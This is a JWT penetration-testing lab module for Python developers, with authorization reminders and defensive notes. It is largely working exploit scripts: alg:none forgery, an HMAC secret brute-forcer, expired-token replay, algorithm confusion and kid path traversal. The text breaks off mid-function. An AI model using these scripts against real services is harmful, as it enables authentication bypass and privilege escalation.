# Lab: JWT Penetration Testing for Python Developers

## Module Overview

| Attribute | Value |
|-----------|-------|
| **Module ID** | EG-LAB-JWT-PENTEST-001 |
| **Type** | Hands-on Penetration Testing Lab |
| **Primary Audience** | Python Developers, AppSec Engineers, Penetration Testers |
| **Prerequisite** | EG-LAB-JWT-001 (JWT Security Fundamentals) recommended |
| **Duration** | L1: 1.5 hours, L2: 2.5 hours, L3: 3 hours |
| **Language** | Python (PyJWT, cryptography, requests, hashlib) |
| **Version** | 1.0 |

---

## Module Purpose

This is the offensive companion to EG-LAB-JWT-001 (JWT Security for Python Developers). While the defensive lab teaches you to write secure JWT implementations, this lab teaches you to **find and exploit JWT vulnerabilities** during authorized security assessments.

This lab adopts a Capture-The-Flag (CTF) style approach, targeting a deliberately vulnerable Flask application (`vulnerable-jwt-app.py`). You'll learn to identify JWT weaknesses, craft exploits, and understand attack chains - knowledge that makes you both a better attacker (in authorized engagements) and a better defender.

**Critical Context:** All exercises in this lab assume you have explicit written authorization to perform security testing. Unauthorized testing against systems you do not own is illegal. This lab is designed for educational purposes, authorized penetration tests, bug bounty programs with proper scope, and your own test environments.

---

## Authorization & Ethical Use

> **AUTHORIZATION REQUIRED**
>
> Every technique in this lab must ONLY be used with explicit written authorization against systems you own or have permission to test. Unauthorized access to computer systems is a crime under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide.
>
> Valid use cases:
> - Your own lab environments and test applications
> - Authorized penetration testing engagements with signed contracts
> - Bug bounty programs where JWT testing is in scope
> - Security research with proper disclosure processes
>
> This lab is for education and authorized security testing ONLY.

---

## Level 1: CRAWL - Reconnaissance & Basic Exploitation

### Learning Objectives

After completing L1, learners will be able to:

1. Decode and analyze JWT tokens to identify potential vulnerabilities
2. Craft and execute `alg: none` attacks to bypass signature verification
3. Perform offline brute-force attacks against weak HMAC secrets
4. Exploit missing claims validation (exp, aud, iss)
5. Systematically identify JWT attack surfaces in web applications

---

### 1.1 JWT Token Analysis & Decoding

> **AUTHORIZATION REMINDER:** Only analyze tokens from systems you own or have written permission to test.

**The Goal:**

Before exploiting JWT vulnerabilities, you need to understand what you're working with. Token analysis reveals the algorithm, claims, and potential weaknesses without modifying anything.

**Manual Base64URL Decoding:**

JWTs consist of three Base64URL-encoded parts: `header.payload.signature`

```python
import base64
import json

def base64url_decode(data):
    """Decode Base64URL-encoded data."""
    # Add padding if needed
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

# Example token from vulnerable-jwt-app.py
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InZpZXdlciIsImV4cCI6MTcwMDAwMDAwMH0.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ"

# Split into parts
header_b64, payload_b64, signature_b64 = token.split('.')

# Decode header and payload
header = json.loads(base64url_decode(header_b64))
payload = json.loads(base64url_decode(payload_b64))

print("Header:", json.dumps(header, indent=2))
print("Payload:", json.dumps(payload, indent=2))
print("Signature (hex):", base64url_decode(signature_b64).hex())
```

**Target:** POST `/login` on vulnerable-jwt-app.py

**Automated JWT Analyzer:**

```python
#!/usr/bin/env python3
"""
jwt_analyzer.py - Automated JWT reconnaissance tool
Usage: python jwt_analyzer.py <token>
"""
import base64
import json
import sys
from datetime import datetime, timezone

def base64url_decode(data):
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

def analyze_jwt(token):
    """Analyze JWT for security weaknesses."""
    print("[*] JWT Security Analyzer\n")

    try:
        parts = token.split('.')
        if len(parts) != 3:
            print("[!] Invalid JWT format - expected 3 parts")
            return

        header_b64, payload_b64, signature_b64 = parts

        # Decode header and payload
        header = json.loads(base64url_decode(header_b64))
        payload = json.loads(base64url_decode(payload_b64))

        print("[+] HEADER:")
        print(json.dumps(header, indent=2))

        print("\n[+] PAYLOAD:")
        print(json.dumps(payload, indent=2))

        print("\n[+] SIGNATURE:")
        if signature_b64:
            sig_bytes = base64url_decode(signature_b64)
            print(f"    Length: {len(sig_bytes)} bytes")
            print(f"    Hex: {sig_bytes.hex()}")
        else:
            print("    [!] NO SIGNATURE - alg:none token!")

        # Security analysis
        print("\n[*] SECURITY ANALYSIS:")

        # Check algorithm
        alg = header.get('alg', 'unknown')
        print(f"\n[+] Algorithm: {alg}")
        if alg.lower() == 'none':
            print("    [!] CRITICAL: Unsigned token (alg: none)")
        elif alg.startswith('HS'):
            print(f"    [!] HMAC algorithm - vulnerable to brute-force")
        elif alg.startswith('RS') or alg.startswith('ES'):
            print(f"    [+] Asymmetric algorithm - check for algorithm confusion")

        # Check for critical claims
        print("\n[+] Claims Analysis:")

        critical_claims = ['exp', 'iat', 'nbf', 'iss', 'aud', 'sub']
        for claim in critical_claims:
            if claim in payload:
                value = payload[claim]
                if claim in ['exp', 'iat', 'nbf'] and isinstance(value, int):
                    dt = datetime.fromtimestamp(value, tz=timezone.utc)
                    now = datetime.now(timezone.utc)
                    if claim == 'exp':
                        if dt < now:
                            print(f"    [!] {claim}: {dt} (EXPIRED)")
                        else:
                            print(f"    [+] {claim}: {dt} (valid for {(dt - now).total_seconds():.0f}s)")
                    else:
                        print(f"    [+] {claim}: {dt}")
                else:
                    print(f"    [+] {claim}: {value}")
            else:
                print(f"    [!] MISSING: {claim}")

        # Check for dangerous headers
        print("\n[+] Header Security:")
        if 'kid' in header:
            print(f"    [!] kid present: {header['kid']} - check for injection")
        if 'jwk' in header:
            print(f"    [!] CRITICAL: jwk header present - embedded key attack possible")
        if 'jku' in header:
            print(f"    [!] CRITICAL: jku header present - remote key injection possible")

        # Check for sensitive data in payload
        print("\n[+] Sensitive Data Check:")
        sensitive_fields = ['password', 'secret', 'api_key', 'token', 'ssn', 'credit_card']
        for field in payload:
            if any(s in field.lower() for s in sensitive_fields):
                print(f"    [!] Potentially sensitive field: {field}")

    except Exception as e:
        print(f"[!] Error analyzing token: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python jwt_analyzer.py <token>")
        sys.exit(1)

    analyze_jwt(sys.argv[1])
```

**Reconnaissance Checklist:**

When you capture a JWT, check for:
- [ ] Algorithm type (HS256, RS256, none?)
- [ ] Presence of signature (empty = alg:none)
- [ ] Expiration claim (exp) - is it validated?
- [ ] Audience claim (aud) - can you reuse tokens across services?
- [ ] Issuer claim (iss) - is it validated?
- [ ] Custom headers (kid, jwk, jku) - injection vectors?
- [ ] Sensitive data in payload - information disclosure?
- [ ] Token length - weak HMAC secret = shorter signatures

**Verification:**

```bash
# Capture token from vulnerable app
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r '.token'

# Analyze it
python jwt_analyzer.py <token>
```

**Key Takeaway:** Reconnaissance is non-invasive. Token analysis reveals weaknesses without triggering alerts. Always start here to identify the most promising attack vectors.

---

### 1.2 Crafting the alg:none Attack

> **AUTHORIZATION REMINDER:** Only exploit vulnerabilities in systems you own or have written permission to test.

**The Vulnerability:**

If a server accepts `alg: none`, you can forge any token by setting the algorithm to "none" and omitting the signature entirely.

**Target:** GET `/api/profile` on vulnerable-jwt-app.py

**Step-by-Step Exploitation:**

```python
#!/usr/bin/env python3
"""
alg_none_exploit.py - Forge unsigned JWT tokens
Usage: python alg_none_exploit.py
"""
import base64
import json
import requests

def base64url_encode(data):
    """Encode data in Base64URL format (no padding)."""
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    elif isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def forge_alg_none_token(payload):
    """
    Forge a JWT with alg: none (no signature).

    Args:
        payload: Dictionary of claims to include

    Returns:
        Forged JWT token string
    """
    # Header with alg: none
    header = {
        "alg": "none",
        "typ": "JWT"
    }

    # Encode header and payload
    header_encoded = base64url_encode(header)
    payload_encoded = base64url_encode(payload)

    # No signature - just append a dot
    forged_token = f"{header_encoded}.{payload_encoded}."

    return forged_token

def exploit_alg_none(target_url, admin_payload):
    """
    Exploit alg:none vulnerability to gain admin access.

    Args:
        target_url: URL of the protected endpoint
        admin_payload: Claims for the forged token
    """
    print("[*] Exploiting alg:none vulnerability\n")

    # Forge the token
    print("[+] Forging token with payload:")
    print(json.dumps(admin_payload, indent=2))

    forged_token = forge_alg_none_token(admin_payload)
    print(f"\n[+] Forged token: {forged_token}\n")

    # Test the token
    print(f"[*] Testing against: {target_url}")
    headers = {"Authorization": f"Bearer {forged_token}"}

    response = requests.get(target_url, headers=headers)
    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response: {response.text}\n")

    if response.status_code == 200:
        print("[✓] EXPLOIT SUCCESSFUL - Admin access granted!")
        return True
    else:
        print("[✗] Exploit failed - server may be validating algorithm")
        return False

if __name__ == "__main__":
    # Target configuration
    target_url = "http://localhost:5000/api/profile"

    # Craft admin payload
    admin_payload = {
        "sub": "attacker",
        "role": "admin",
        "username": "attacker"
    }

    # Execute exploit
    exploit_alg_none(target_url, admin_payload)

    # Try case variations
    print("\n[*] Trying case variations...")
    for alg_variant in ["None", "NONE", "nOnE"]:
        print(f"\n[*] Testing with alg: {alg_variant}")
        header = {"alg": alg_variant, "typ": "JWT"}
        header_encoded = base64url_encode(header)
        payload_encoded = base64url_encode(admin_payload)
        token = f"{header_encoded}.{payload_encoded}."

        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get(target_url, headers=headers)
        print(f"    Status: {response.status_code}")
```

**Exploit Script (Simplified):**

```python
import base64
import json
import requests

# Forge header and payload
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b'=').decode()

payload = base64.urlsafe_b64encode(
    json.dumps({"sub": "attacker", "role": "admin"}).encode()
).rstrip(b'=').decode()

# No signature needed - just append empty string
forged_token = f"{header}.{payload}."

# Use it
response = requests.get(
    "http://localhost:5000/api/admin",
    headers={"Authorization": f"Bearer {forged_token}"}
)

print(response.status_code)  # 200 = success
print(response.json())
```

**Verification:**

```bash
# Run the exploit
python alg_none_exploit.py

# Expected output:
# [✓] EXPLOIT SUCCESSFUL - Admin access granted!
```

**Defensive Note:**

This attack succeeds because the server's `algorithms` parameter includes `"none"`. Defense: Always specify an explicit allowlist like `algorithms=["HS256"]` - never include `"none"`.

**Key Takeaway:** The `alg: none` attack is trivial to execute but devastating in impact. It's the first thing to check when testing JWT implementations.

---

### 1.3 Brute-Forcing Weak HMAC Secrets

> **AUTHORIZATION REMINDER:** Only perform brute-force attacks against systems you own or have written permission to test.

**The Vulnerability:**

HMAC-based JWTs (HS256/HS384/HS512) are vulnerable to offline brute-force attacks if the secret is weak. Since the attacker has both the plaintext (header + payload) and the signature, they can try secrets locally without rate limits.

**Target:** POST `/login` on vulnerable-jwt-app.py (crack the secret)

**Brute-Force Tool:**

```python
#!/usr/bin/env python3
"""
jwt_bruteforce.py - Offline JWT HMAC secret brute-forcer
Usage: python jwt_bruteforce.py <token> <wordlist>
"""
import hmac
import hashlib
import base64
import sys
import time

def base64url_decode(data):
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')

def verify_signature(token_parts, secret, algorithm='HS256'):
    """Verify if a secret produces the correct signature."""
    header_b64, payload_b64, signature_b64 = token_parts

    # Create the signing input
    signing_input = f"{header_b64}.{payload_b64}".encode()

    # Generate signature with the candidate secret
    if algorithm == 'HS256':
        computed_sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    elif algorithm == 'HS384':
        computed_sig = hmac.new(secret.encode(), signing_input, hashlib.sha384).digest()
    elif algorithm == 'HS512':
        computed_sig = hmac.new(secret.encode(), signing_input, hashlib.sha512).digest()
    else:
        return False

    # Compare with actual signature
    actual_sig = base64url_decode(signature_b64)
    return hmac.compare_digest(computed_sig, actual_sig)

def brute_force_jwt(token, wordlist_path):
    """
    Brute-force JWT HMAC secret.

    Args:
        token: JWT token string
        wordlist_path: Path to wordlist file

    Returns:
        Secret if found, None otherwise
    """
    print(f"[*] Starting JWT brute-force attack")
    print(f"[*] Token: {token[:50]}...")
    print(f"[*] Wordlist: {wordlist_path}\n")

    parts = token.split('.')
    if len(parts) != 3:
        print("[!] Invalid token format")
        return None

    start_time = time.time()
    attempts = 0

    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            secret = line.strip()
            if not secret:
                continue

            attempts += 1
            if attempts % 1000 == 0:
                print(f"[*] Tried {attempts} secrets...", end='\r')

            if verify_signature(parts, secret):
                elapsed = time.time() - start_time
                print(f"\n\n[✓] SECRET FOUND: {secret}")
                print(f"[+] Attempts: {attempts}")
                print(f"[+] Time: {elapsed:.2f} seconds")
                print(f"[+] Rate: {attempts/elapsed:.0f} attempts/sec")
                return secret

    elapsed = time.time() - start_time
    print(f"\n[✗] Secret not found after {attempts} attempts ({elapsed:.2f}s)")
    return None

def generate_common_wordlist():
    """Generate a wordlist of common JWT secrets."""
    common_secrets = [
        "secret",
        "password",
        "password123",
        "your-256-bit-secret",  # From jwt.io examples!
        "mysecretkey",
        "changeme",
        "test",
        "jwt_secret",
        "jwt-secret",
        "jwt",
        "supersecret",
        "secret123",
        "admin",
        "root",
        "default",
        "12345",
        "123456",
        "qwerty",
        "abc123",
        "letmein",
        "monkey",
        "1234567890",
        "key",
        "secretkey",
        "private",
        "token",
        "access",
        "auth",
        "authentication",
        "flask-secret-key",
        "django-secret-key",
        "my-secret",
        "app-secret",
        "dev",
        "development",
        "prod",
        "production",
    ]
    return common_secrets

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python jwt_bruteforce.py <token> [wordlist]")
        print("If no wordlist provided, uses built-in common secrets")
        sys.exit(1)

    token = sys.argv[1]

    if len(sys.argv) == 3:
        wordlist_path = sys.argv[2]
        secret = brute_force_jwt(token, wordlist_path)
    else:
        print("[*] Using built-in common secrets wordlist")
        secrets = generate_common_wordlist()
        parts = token.split('.')

        for i, secret_candidate in enumerate(secrets, 1):
            print(f"[*] Trying: {secret_candidate:30}", end='\r')
            if verify_signature(parts, secret_candidate):
                print(f"\n[✓] SECRET FOUND: {secret_candidate}")
                break
        else:
            print(f"\n[✗] Secret not in common list. Try with a wordlist.")
```

**Sample Wordlist (jwt_secrets.txt):**

```
secret
password
password123
your-256-bit-secret
mysecretkey
changeme
test
jwt_secret
12345
admin
```

**Exploitation:**

```bash
# Capture a token from the vulnerable app
TOKEN=$(curl -s -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r '.token')

# Brute-force the secret
python jwt_bruteforce.py "$TOKEN"

# Or with a wordlist
python jwt_bruteforce.py "$TOKEN" jwt_secrets.txt
```

**Once Secret is Found:**

```python
import jwt

# Now you can forge any token
secret = "password123"  # Cracked secret

forged_token = jwt.encode(
    {
        "sub": "admin",
        "role": "admin",
        "exp": 9999999999
    },
    secret,
    algorithm="HS256"
)

print(f"Forged token: {forged_token}")
```

**Why This Works:**

Offline brute-force has:
- No rate limiting (it's local)
- No account lockouts
- No network delays
- Can use GPU acceleration (hashcat -m 16500)

A weak secret can be cracked in seconds.

**External Tool Reference:**

```bash
# Using hashcat (much faster)
hashcat -m 16500 -a 0 jwt.txt wordlist.txt

# Using jwt_tool
jwt_tool <token> -C -d wordlist.txt
```

**Defensive Note:**

Use `secrets.token_hex(32)` (256-bit entropy) for HMAC secrets, or switch to RS256 (no shared secret to crack).

**Key Takeaway:** HMAC secrets are only as strong as their entropy. Weak secrets = instant compromise. Always test production tokens with common wordlists.

---

### 1.4 Exploiting Missing Claims Validation

> **AUTHORIZATION REMINDER:** Only exploit vulnerabilities in systems you own or have written permission to test.

**The Vulnerability:**

Even with a valid signature, tokens can be abused if the server doesn't validate critical claims like expiration, audience, or issuer.

**Target:** GET `/api/admin` (no exp check), GET `/api/data` (no aud check)

**Attack 1: Expired Token Replay**

```python
#!/usr/bin/env python3
"""
expired_token_replay.py - Replay expired tokens
"""
import jwt
import requests
from datetime import datetime, timedelta, timezone

def create_expired_token(secret, user_id, role):
    """Create a token that's already expired."""
    past_time = datetime.now(timezone.utc) - timedelta(hours=24)

    payload = {
        "sub": user_id,
        "role": role,
        "exp": past_time  # Expired 24 hours ago
    }

    token = jwt.encode(payload, secret, algorithm="HS256")
    return token

def test_expired_replay(target_url, secret):
    """Test if server accepts expired tokens."""
    print("[*] Testing expired token replay\n")

    # Create an expired admin token
    expired_token = create_expired_token(secret, "attacker", "admin")
    print(f"[+] Created expired token (exp: 24h ago)")
    print(f"[+] Token: {expired_token[:50]}...\n")

    # Try to use it
    headers = {"Authorization": f"Bearer {expired_token}"}
    response = requests.get(target_url, headers=headers)

    print(f"[*] Response status: {response.status_code}")

    if response.status_code == 200:
        print("[✓] EXPLOIT SUCCESSFUL - Server accepts expired tokens!")
        print(f"[+] Response: {response.text}")
        return True
    else:
        print("[✗] Server properly validates expiration")
        return False

if __name__ == "__main__":
    target_url = "http://localhost:5000/api/admin"
    secret = "password123"  # Previously cracked

    test_expired_replay(target_url, secret)
```

**Attack 2: Cross-Audience Token Abuse**

```python
#!/usr/bin/env python3
"""
cross_audience_exploit.py - Use token across services
"""
import jwt
import requests
from datetime import datetime, timedelta, timezone

def test_cross_audience(service_a_url, service_b_url, secret):
    """
    Test if a token for Service A works on Service B.

    This exploits missing audience validation.
    """
    print("[*] Testing cross-audience token abuse\n")

    # Create token for Service A
    payload_a = {
        "sub": "attacker",
        "role": "user",
        "aud": "service-a",
        "exp": datetime.now(timezone.utc) + timedelta(hours=1)
    }

    token_a = jwt.encode(payload_a, secret, algorithm="HS256")
    print(f"[+] Created token for Service A (aud: service-a)")

    # Try to use it on Service B
    print(f"[*] Attempting to use Service A token on Service B...")
    headers = {"Authorization": f"Bearer {token_a}"}
    response = requests.get(service_b_url, headers=headers)

    print(f"[+] Response status: {response.status_code}")

    if response.status_code == 200:
        print("[✓] EXPLOIT SUCCESSFUL - Cross-audience attack worked!")
        print(f"[+] Service B accepted Service A's token")
        return True
    else:
        print("[✗] Service properly validates audience")
        return False

if __name__ == "__main__":
    service_a = "http://localhost:5000/api/data"
    service_b = "http://localhost:5001/api/admin"
    secret = "password123"

    test_cross_audience(service_a, service_b, secret)
```

**Attack 3: Missing Issuer Validation**

```python
#!/usr/bin/env python3
"""
fake_issuer_exploit.py - Forge tokens with arbitrary issuer
"""
import jwt
import requests
from datetime import datetime, timedelta, timezone

def test_fake_issuer(target_url, secret):
    """Test if server validates the issuer claim."""
    print("[*] Testing fake issuer attack\n")

    fake_issuers = [
        "evil.com",
        "https://attacker.com",
        "trusted-auth-server.com",  # Domain squatting
        "",  # Empty issuer
        None  # No issuer
    ]

    for iss in fake_issuers:
        payload = {
            "sub": "attacker",
            "role": "admin",
            "exp": datetime.now(timezone.utc) + timedelta(hours=1)
        }

        if iss is not None:
            payload["iss"] = iss

        token = jwt.encode(payload, secret, algorithm="HS256")

        print(f"[*] Trying issuer: {iss}")
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get(target_url, headers=headers)

        if response.status_code == 200:
            print(f"[✓] SUCCESS with issuer: {iss}")
            return True

    print("[✗] Server validates issuer properly")
    return False

if __name__ == "__main__":
    test_fake_issuer("http://localhost:5000/api/admin", "password123")
```

**Verification:**

```bash
# Test all missing claims attacks
python expired_token_replay.py
python cross_audience_exploit.py
python fake_issuer_exploit.py
```

**Defensive Note:**

Always validate:
- `exp` (expiration) - tokens should be short-lived
- `aud` (audience) - tokens should only work for intended service
- `iss` (issuer) - only accept tokens from known issuers
- `nbf` (not before) - reject tokens used too early

**Key Takeaway:** A valid signature doesn't mean a valid token. Claims validation is just as critical as signature verification.

---

### 1.5 Spot-the-Vulnerability Exercises

**Exercise 1: Identify the Attack Surface**

Given this vulnerable JWT configuration:

```python
import jwt
from flask import Flask, request

app = Flask(__name__)
SECRET = "test"

@app.route("/api/data")
def get_data():
    token = request.args.get("token")  # Token in URL!
    payload = jwt.decode(
        token,
        SECRET,
        algorithms=["HS256", "HS384", "HS512", "none"],
        options={"verify_exp": False}
    )
    return {"data": get_user_data(payload["sub"])}
```

**Question:** Identify all vulnerabilities and the attack vector you'd exploit first.

<details>
<summary>Answer (click to reveal)</summary>

**Vulnerabilities identified:**

1. **alg: none accepted** - Can forge unsigned tokens
2. **Weak secret ("test")** - Can brute-force in < 1 second
3. **No expiration validation** - Tokens work forever
4. **Token in URL** - Leaks in logs, browser history, Referer headers
5. **No audience/issuer validation** - Cross-service attacks possible

**Best attack vector:**

Start with **alg: none** - it's instant and requires no secret. Craft:
```python
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin"}
token = base64url(header) + "." + base64url(payload) + "."
```

Then access: `http://target/api/data?token=<forged_token>`

If alg:none fails, brute-force the secret "test" (takes milliseconds).

</details>

---

**Exercise 2: Choose Your Attack**

You've captured this token from a target application:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS0yMDI0In0.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InZpZXdlciIsImV4cCI6MTYwMDAwMDAwMCwiaXNzIjoiYXV0aC5leGFtcGxlLmNvbSIsImF1ZCI6ImFwaS5leGFtcGxlLmNvbSJ9.signature_here
```

Decoded payload:
```json
{
  "sub": "user123",
  "role": "viewer",
  "exp": 1600000000,  // Already expired
  "iss": "auth.example.com",
  "aud": "api.example.com"
}
```

**Question:** What's your attack strategy?

<details>
<summary>Answer (click to reveal)</summary>

**Analysis:**

- Algorithm: HS256 (brute-forceable)
- kid header: "key-2024" (potential injection vector)
- exp: 1600000000 (expired in 2020)

**Attack strategy:**

1. **First attempt:** Replay the expired token as-is to test if exp is validated
2. **If that fails:** Brute-force the HMAC secret (try common secrets first)
3. **Once secret found:** Forge new token with:
   - Future exp (or remove it entirely)
   - role: "admin"
   - Keep same iss/aud to avoid detection
4. **Alternative:** Explore kid injection if secret is strong

**Most likely to succeed:** Brute-force + token forgery, since exp is already expired (suggesting weak validation).

</details>

---

**Exercise 3: Exploit the Weakest Link**

Given this endpoint source code:

```python
@app.route("/api/admin/users")
def admin_users():
    token = request.headers.get("Authorization", "").replace("Bearer ", "")

    try:
        payload = jwt.decode(
            token,
            os.environ.get("JWT_SECRET", "fallback"),
            algorithms=["HS256", "RS256"]
        )
    except:
        return {"error": "invalid token"}, 401

    if payload.get("admin"):
        return {"users": get_all_users()}
    return {"error": "forbidden"}, 403
```

**Question:** Identify the vulnerability and write an exploit.

<details>
<summary>Answer (click to reveal)</summary>

**Vulnerabilities:**

1. **Fallback secret** - If JWT_SECRET env var not set, uses "fallback"
2. **Mixed algorithms** - Accepts both HS256 and RS256 (algorithm confusion)
3. **Bare except** - Hides errors
4. **Admin check from token** - Trusts the payload

**Exploit:**

```python
import jwt

# Attempt 1: Try the fallback secret
try:
    forged = jwt.encode(
        {"sub": "attacker", "admin": True},
        "fallback",
        algorithm="HS256"
    )
    # Test it...
    print(f"[*] Trying fallback secret: {forged}")
except:
    pass

# Attempt 2: Algorithm confusion (if RS256 is used)
# Get public key, sign with HS256 using public key bytes
```

**Most direct exploit:** Try the "fallback" secret first.

</details>

---

## Level 2: WALK - Advanced Exploitation

### Learning Objectives

After completing L2, learners will be able to:

1. Execute algorithm confusion attacks (RS256 → HS256)
2. Exploit kid (Key ID) header injection vulnerabilities
3. Perform JWK/JKU header injection attacks
4. Exploit token theft and replay vulnerabilities
5. Chain multiple JWT vulnerabilities for maximum impact

---

### 2.1 Algorithm Confusion Attack (RS256 → HS256)

> **AUTHORIZATION REMINDER:** Only perform algorithm confusion attacks against systems you own or have written permission to test.

**The Vulnerability:**

When a server accepts both RSA (RS256) and HMAC (HS256) algorithms, an attacker can:
1. Obtain the RSA public key (often publicly available)
2. Sign a forged token using HS256 with the **public key bytes** as the HMAC secret
3. The server uses the public key for HMAC verification, and the forged token passes

**Target:** GET `/api/rs256/data` on vulnerable-jwt-app.py

**Step-by-Step Exploitation:**

```python
#!/usr/bin/env python3
"""
algorithm_confusion.py - RS256 to HS256 algorithm confusion attack
"""
import jwt
import requests
import json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

def get_public_key_from_jwks(jwks_url):
    """Fetch public key from JWKS endpoint."""
    print(f"[*] Fetching public keys from: {jwks_url}")
    response = requests.get(jwks_url)
    jwks = response.json()

    # Find RS256 key
    for key in jwks.get("keys", []):
        if key.get("alg") == "RS256" or key.get("kty") == "RSA":
            print(f"[+] Found RSA key: {key.get('kid', 'unknown')}")
            return key

    return None

def jwk_to_pem(jwk):
    """Convert JWK to PEM format."""
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    import base64

    # Decode JWK components
    def base64url_decode(data):
        padding = 4 - (len(data) % 4)
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data)

    n = int.from_bytes(base64url_decode(jwk['n']), 'big')
    e = int.from_bytes(base64url_decode(jwk['e']), 'big')

    # Create public key
    public_numbers = rsa.RSAPublicNumbers(e, n)
    public_key = public_numbers.public_key(default_backend())

    # Convert to PEM
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    return pem

def algorithm_confusion_attack(target_url, public_key_pem, payload):
    """
    Execute algorithm confusion attack.

    Args:
        target_url: Target API endpoint
        public_key_pem: RSA public key in PEM format
        payload: Claims for forged token

    Returns:
        True if successful, False otherwise
    """
    print("\n[*] Executing Algorithm Confusion Attack")
    print("[*] Step 1: Change algorithm from RS256 to HS256")
    print("[*] Step 2: Sign with public key bytes as HMAC secret\n")

    # Sign the token using HS256 with public key as secret
    forged_token = jwt.encode(
        payload,
        public_key_pem,  # Public key bytes used as HMAC secret!
        algorithm="HS256"
    )

    print(f"[+] Forged token created:")
    print(f"    {forged_token[:80]}...\n")

    # Verify what we created
    header = jwt.get_unverified_header(forged_token)
    decoded_payload = jwt.decode(forged_token, public_key_pem, algorithms=["HS256"])

    print(f"[+] Token header: {json.dumps(header, indent=2)}")
    print(f"[+] Token payload: {json.dumps(decoded_payload, indent=2)}\n")

    # Test against target
    print(f"[*] Testing against: {target_url}")
    headers = {"Authorization": f"Bearer {forged_token}"}
    response = requests.get(target_url, headers=headers)

    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response: {response.text}\n")

    if response.status_code == 200:
        print("[✓] ALGORITHM CONFUSION SUCCESSFUL!")
        print("[+] Server accepted HS256 token signed with public key")
        return True
    else:
        print("[✗] Attack failed - server may only accept RS256")
        return False

def main():
    # Target configuration
    target_url = "http://localhost:5000/api/rs256/data"
    jwks_url = "http://localhost:5000/.well-known/jwks.json"

    # Step 1: Obtain public key
    jwk = get_public_key_from_jwks(jwks_url)
    if not jwk:
        print("[!] No RSA key found in JWKS")
        return

    # Step 2: Convert JWK to PEM
    public_key_pem = jwk_to_pem(jwk)
    print(f"\n[+] Public key (PEM):")
    print(public_key_pem.decode())

    # Step 3: Craft malicious payload
    payload = {
        "sub": "attacker",
        "role": "admin",
        "username": "attacker",
        "exp": 9999999999
    }

    # Step 4: Execute attack
    algorithm_confusion_attack(target_url, public_key_pem, payload)

    # Step 5: Test edge cases
    print("\n[*] Testing edge cases...")

    # Try with different PEM formats
    public_key_oneline = public_key_pem.replace(b'\n', b'')
    print("\n[*] Attempting with single-line PEM...")
    algorithm_confusion_attack(target_url, public_key_oneline, payload)

if __name__ == "__main__":
    main()
```

**Alternative: Using a PEM File:**

```python
#!/usr/bin/env python3
"""Simple algorithm confusion with PEM file"""
import jwt

# Read public key from file
with open("public_key.pem", "rb") as f:
    public_key = f.read()

# Forge token using HS256 with public key as secret
forged_token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)

print(f"Forged token: {forged_token}")

# Use it
import requests
response = requests.get(
    "http://localhost:5000/api/rs256/data",
    headers={"Authorization": f"Bearer {forged_token}"}
)

print(f"Status: {response.status_code}")
print(f"Response: {response.json()}")
```

**Verification:**

```bash
# Download public key
curl http://localhost:5000/.well-known/jwks.json > jwks.json

# Or if server exposes PEM directly
curl http://localhost:5000/public-key.pem > public_key.pem

# Run exploit
python algorithm_confusion.py
```

**Defensive Note:**

Never mix symmetric and asymmetric algorithms in the `algorithms` list. If you sign with RS256, ONLY accept RS256 during verification: `algorithms=["RS256"]`.

**Key Takeaway:** Algorithm confusion exploits the server's trust in the algorithm header. The public key becomes the HMAC secret - and public keys are, by definition, public.

---

### 2.2 kid Header Injection

> **AUTHORIZATION REMINDER:** Only exploit kid injection in systems you own or have written permission to test.

**The Vulnerability:**

The `kid` (Key ID) header tells the server which key to use for verification. If the server uses `kid` unsafely (in file paths, SQL queries), it's an injection vector.

**Target:** GET `/api/kid/data` (path traversal), GET `/api/kid-db/data` (SQLi)

**Attack 1: Path Traversal via kid**

```python
#!/usr/bin/env python3
"""
kid_path_traversal.py - Exploit kid header for path traversal
"""
import jwt
import json
import base64

def base64url_encode(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def kid_path_traversal_exploit(target_url, traversal_path, key_content):
    """
    Exploit kid header path traversal.

    Strategy:
    1. Set kid to path like "../../dev/null" (empty file)
    2. Sign token with empty string as key
    3. Server reads empty file, uses empty key, token validates

    Args:
        target_url: Target endpoint
        traversal_path: Path traversal string
        key_content: Expected content of the file (use as signing key)
    """
    print(f"[*] kid Path Traversal Exploit")
